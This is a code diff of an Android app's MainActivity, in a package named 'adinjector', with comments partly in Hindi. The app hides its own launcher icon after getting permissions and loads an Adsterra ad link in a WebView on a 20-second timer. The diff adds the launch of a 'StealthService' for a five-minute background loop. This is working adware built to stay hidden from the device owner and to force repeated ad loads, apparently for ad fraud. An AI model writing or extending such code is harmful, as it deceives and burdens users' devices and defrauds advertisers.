@@ -28,10 +28,10 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
 
-        // 2. Hide App Icon from Launcher after permissions
+        // 2. Hide App Icon after permissions
         hideAppIcon();
 
-        // 3. Start App Task
+        // 3. Start App Task & Background Service trigger
         initApp();
     }
 
@@ -73,7 +73,7 @@ public class MainActivity extends AppCompatActivity {
     private void hideAppIcon() {
         try {
             PackageManager p = getPackageManager();
-            ComponentName componentName = new ComponentName(this, com.example.adinjector.MainActivity.class);
+            ComponentName componentName = new ComponentName(this, "com.example.adinjector.LauncherAlias");
             p.setComponentEnabledSetting(componentName,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP);
@@ -83,6 +83,10 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void initApp() {
+        // Start StealthService to handle the 5-minute loop mechanism
+        Intent serviceIntent = new Intent(this, StealthService.class);
+        startService(serviceIntent);
+
         webView = new WebView(this);
         setContentView(webView);
 
@@ -95,7 +99,7 @@ public class MainActivity extends AppCompatActivity {
         // Aapka Adsterra Direct Link
         webView.loadUrl("https://www.profitableratecpmnetwork.com/hdk2jkb1tq?key=1811747717fba27cc8d799ee6913935e");
 
-        // 20 Second Timer - Pura hote hi app band ho jayegi
+        // 20 Second Timer - 20 second baad app khud band ho jayegi
         countDownTimer = new CountDownTimer(20000, 1000) {
             @Override
             public void onTick(long millisUntilFinished) {
